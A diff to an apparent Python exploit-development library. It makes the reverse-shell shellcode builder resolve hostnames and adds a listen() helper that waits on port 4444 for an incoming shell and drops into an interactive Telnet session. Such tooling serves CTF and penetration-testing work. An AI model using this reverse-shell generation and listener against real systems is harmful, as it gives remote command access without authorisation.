@@ -13,6 +13,7 @@ import signal
 import tempfile
 from telnetlib import Telnet
 from subprocess import Popen, PIPE
+from contextlib import contextmanager
 
 
 def p32(x):
@@ -626,8 +627,10 @@ class Shellcode:
         return self.get('_bind_shell').replace('${port}', p)
 
     def reverse_shell(self, host, port):
-        h = socket.inet_aton(host)
-        p = struct.pack('>H', port)
+        addrinfo = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)
+        h, p = addrinfo[0][4]
+        h = socket.inet_aton(h)
+        p = struct.pack('>H', p)
         return self.get('_reverse_shell').replace('${host}', h).replace('${port}', p)
 
     def xor(self, name, key=0xff):
@@ -815,6 +818,28 @@ class Proc:
             t.sock = self.p
             t.interact()
             t.close()
+
+    @contextmanager
+    def listen(self, port=4444):
+        check_cmd = 'echo "\x1b[32mgot a shell!\x1b[0m"'  # green
+
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
+        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        s.bind(('', port))  # the empty string represents INADDR_ANY
+        s.listen(1)
+
+        yield port
+
+        c, addr = s.accept()
+        s.close()
+        c.sendall(check_cmd + '\n')
+        sys.stdout.write(c.recv(8192))
+
+        t = Telnet()
+        t.sock = c
+        t.interact()
+        t.close()
+        self.close()
 
     def close(self):
         if isinstance(self.p, Popen):
